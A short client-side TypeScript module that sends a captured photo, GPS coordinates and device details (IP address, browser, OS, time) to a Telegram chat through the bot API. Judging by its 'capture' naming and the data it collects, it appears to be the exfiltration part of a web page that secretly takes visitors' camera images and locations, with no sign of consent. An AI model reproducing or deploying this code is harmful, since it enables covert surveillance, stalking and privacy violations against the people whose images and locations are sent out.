"use client"

import axios from 'axios';

const TELEGRAM_API_URL = 'https://api.telegram.org/bot';

export interface DeviceInfo {
  ip: string;
  browser: string;
  os: string;
  timestamp: string;
}

export interface LocationInfo {
  latitude: number;
  longitude: number;
}

export interface CaptureData {
  image: string;
  location: LocationInfo;
  deviceInfo: DeviceInfo;
}

export async function sendTelegramMessage(
  botToken: string,
  chatId: string,
  data: CaptureData
) {
  try {
    // Send image
    if (data.image) {
      const imageBlob = await fetch(data.image).then(r => r.blob())
      const imageFormData = new FormData()
      imageFormData.append('photo', imageBlob, 'capture.jpg')
      imageFormData.append('chat_id', chatId)
      imageFormData.append('caption', `New capture from ${data.deviceInfo.browser}`)

      await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: 'POST',
        body: imageFormData
      })
    }

    // Send location
    if (data.location.latitude && data.location.longitude) {
      await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: chatId,
          latitude: data.location.latitude,
          longitude: data.location.longitude
        })
      })
    }

    // Send device info
    const message = `
Device Information:
IP: ${data.deviceInfo.ip}
Browser: ${data.deviceInfo.browser}
OS: ${data.deviceInfo.os}
Time: ${new Date(data.deviceInfo.timestamp).toLocaleString()}
    `.trim()

    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message
      })
    })
  } catch (error) {
    console.error('Error sending to Telegram:', error)
    throw error
  }
} 